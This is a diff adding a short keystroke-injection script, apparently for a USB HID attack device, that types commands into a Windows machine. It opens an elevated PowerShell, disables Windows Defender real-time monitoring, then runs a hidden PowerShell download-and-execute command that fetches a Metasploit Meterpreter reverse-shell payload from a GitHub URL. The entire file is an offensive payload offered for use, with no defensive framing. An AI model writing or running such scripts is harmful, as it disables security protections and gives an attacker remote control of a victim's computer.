@@ -1,0 +1,26 @@
+Rem: Disable windows defender and open a reverse meterperter shell.
+
+Rem:Disable Windows Defender with Powershell
+CustomDelay:1000
+Press:131+114
+CustomDelay:200
+Print:powershell Start-Process powershell -Verb runAs
+Press:176
+CustomDelay:1000
+Press:130+121
+CustomDelay:200
+Print:Set-MpPreference -DisableRealtimeMonitoring $true
+Press:176
+Print:exit
+Press:176
+CustomDelay:800
+Press:131+114
+CustomDelay:800
+Print:cmd
+CustomDelay:300
+Press:176
+CustomDelay:300
+Rem: Downloading the metasploit meterperter payload.
+Print:powershell -wind hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Squiglygon/lectures/master/msf_rs')
+CustomDelay:300
+Press:176
